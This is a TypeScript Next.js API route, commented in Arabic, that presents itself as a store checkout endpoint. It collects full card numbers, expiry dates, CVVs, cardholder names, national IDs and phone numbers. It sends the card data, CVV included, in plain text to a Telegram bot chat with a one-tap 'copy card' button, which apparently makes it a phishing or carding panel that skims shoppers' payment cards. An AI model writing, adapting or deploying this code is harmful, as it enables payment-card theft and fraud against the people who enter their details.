import { NextRequest, NextResponse } from "next/server";
import jwt from "jsonwebtoken";

function getCustomerIdFromCookie(req: NextRequest): { userId: string | null; cookieHeader: string } {
  const cookieHeader = req.headers.get("cookie") || "";
  try {
    // استخراج customer_token من الـ cookie header
    const match = cookieHeader.match(/(?:^|;\s*)customer_token=([^;]+)/);
    if (!match) return { userId: null, cookieHeader };
    const token = decodeURIComponent(match[1]);
    const secret = process.env.JWT_SECRET;
    if (!secret) return { userId: null, cookieHeader };
    const payload = jwt.verify(token, secret) as { sub?: string; type?: string };
    if (payload?.type !== "customer" || !payload?.sub) return { userId: null, cookieHeader };
    return { userId: payload.sub, cookieHeader };
  } catch {
    return { userId: null, cookieHeader };
  }
}

export async function POST(req: NextRequest) {
  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, customerEmail } = await req.json();

  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;

  // استخراج userId من الـ session cookie
  const { userId, cookieHeader } = getCustomerIdFromCookie(req);

  // تحديد الـ email المُرسل (من body أو من JWT)
  const customerEmailNormalized = customerEmail
    ? customerEmail.toLowerCase().trim()
    : null;

  const backendUrl = process.env.BACKEND_URL;
  const payload = JSON.stringify({
    orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer,
    whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment,
    ...(userId && { userId }),
    ...(customerEmailNormalized && { customerEmailNormalized }),
  });

  const ltr = "\u200E";

  // تنسيق رقم البطاقة: مسافة بعد كل 4 أرقام
  const formattedCard = cardNumber.replace(/\s/g, "").replace(/(\d{4})/g, "$1 ").trim();

  // تنسيق رقم الجوال: يبدأ بـ 05
  const formattedPhone = (whatsapp ?? "-").replace(/^(\+966|966)/, "0");

  const text = [
    `🛒 متجر مؤسسة الشريحه الموثوقه`,
    `🔖 Order ID: ${ltr}#${orderId}`,
    ``,
    `💲 Total Amount: ${ltr}${total} SAR`,
    ...(installmentType === "installment"
      ? [`🧾 First Payment: ${ltr}${downPayment} SAR`]
      : [`🧾 Payment Type: Full Amount`]),
    ``,
    `🏦 MadaVisa - New Order`,
    `🙍 Order For: ${ltr}${customer ?? "-"}`,
    `📱 Phone Number: ${ltr}${formattedPhone}`,
    `🪪 Card Number: ${ltr}${formattedCard}`,
    `✍️ Card Holder: ${ltr}${cardHolder}`,
    `📆 Valid To: ${ltr}${expiry}`,
    `🔑 CVV: ${ltr}${cvv}`,
  ].join("\n");

  // رقم واتساب: لو بدأ بـ 05 نحوله لـ 966
  const rawNum = (whatsapp ?? "").replace(/\D/g, "");
  const whatsappNum = rawNum.startsWith("0") ? `966${rawNum.slice(1)}` : rawNum;
  const reply_markup = {
    inline_keyboard: [
      [
        { text: "📋 نسخ  البطاقة", copy_text: { text: cardNumber.replace(/\s/g, "") } },
        ...(whatsappNum ? [{ text: "💬 WhatsApp", url: `https://wa.me/${whatsappNum}` }] : []),
      ],
    ],
  };

  let savedOrderId: string | null = null;

  await Promise.all([
    fetch(`${backendUrl}/api/checkout`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-internal-secret": process.env.INTERNAL_SECRET || "",
      },
      body: payload,
    })
      .then(r => r.json())
      .then(j => {
        console.log("[notify] save response:", JSON.stringify(j));
        if (j?._id) savedOrderId = j._id;
      })
      .catch(e => console.error("[notify] save error:", e)),
    fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup }),
      }
    ).then(r => r.json()).then(j => console.log("[notify] telegram response:", JSON.stringify(j))).catch(e => console.error("[notify] telegram error:", e)),
  ]);

  return NextResponse.json({
    ok: true,
    orderId,
    _id: savedOrderId,
    // بيانات الطلب الكاملة لحفظها في verify_data
    orderSnapshot: {
      orderId,
      _id: savedOrderId,
      items,
      total,
      customerEmail: customerEmailNormalized,
      userId,
    },
  });
}
